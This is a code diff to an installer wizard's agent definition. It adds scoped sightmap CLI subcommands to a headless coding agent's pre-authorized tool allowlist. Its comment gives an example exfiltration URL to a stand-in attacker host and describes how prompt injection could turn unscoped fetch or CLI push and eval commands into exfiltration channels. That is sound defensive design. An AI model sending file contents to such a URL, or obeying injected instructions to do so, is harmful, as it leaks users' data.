@@ -8,15 +8,22 @@ import { extractTelemetryMarkers } from './telemetry-marker.js';
 import type { AgentDefinition, LaunchContext, LaunchResult } from './types.js';
 
 /**
- * Tools the headless run is pre-authorized to use beyond edits: docs fetching
- * and dependency installs. Telemetry needs no tool here — the agent just prints
- * markers to stdout that the wizard parses. Everything else falls back to
- * Claude Code's own permission rules.
+ * Tools the headless run is pre-authorized to use beyond edits: docs fetching,
+ * dependency installs, and the sightmap CLI's authoring subcommands. Telemetry
+ * needs no tool here — the agent just prints markers to stdout that the wizard
+ * parses. Everything else falls back to Claude Code's own permission rules.
  *
  * WebFetch is scoped to the two Subtext/Fullstory doc domains the install
  * actually needs. Leaving it unscoped would make it an exfiltration channel
  * under prompt injection (fetch `https://attacker.com/?data=<file contents>`);
  * the domain scope closes that.
+ *
+ * The sightmap entries are scoped the same way: only the subcommands the
+ * sightmap-authoring prompt (see prompt/sightmap.ts) actually tells the agent
+ * to run. `sightmap` also has a `push` command that POSTs a corpus to an
+ * arbitrary URL and a `browser eval` that runs arbitrary JS in the page — an
+ * unscoped `Bash(sightmap:*)` would hand a prompt injection an exfiltration
+ * path the same way an unscoped WebFetch would, so those are left out.
  */
 const ALLOWED_TOOLS = [
   'WebFetch(domain:subtext.fullstory.com)',
@@ -25,6 +32,13 @@ const ALLOWED_TOOLS = [
   'Bash(pnpm add:*)',
   'Bash(yarn add:*)',
   'Bash(bun add:*)',
+  'Bash(sightmap version:*)',
+  'Bash(sightmap --help:*)',
+  'Bash(sightmap validate:*)',
+  'Bash(sightmap lint:*)',
+  'Bash(sightmap browser start:*)',
+  'Bash(sightmap snapshot:*)',
+  'Bash(sightmap sel-probe:*)',
 ];
 
 async function findClaudeBinary(): Promise<string | null> {
@@ -128,7 +142,7 @@ export const claudeCode: AgentDefinition = {
   name: 'Claude Code',
   kind: 'terminal',
   autonomy:
-    'auto-accepting file edits and running a limited set of commands (dependency installs and Subtext doc fetches)',
+    'auto-accepting file edits and running a limited set of commands (dependency installs, Subtext doc fetches, and sightmap CLI commands)',
   async detect() {
     const binaryPath = await findClaudeBinary();
     if (!binaryPath) return null;
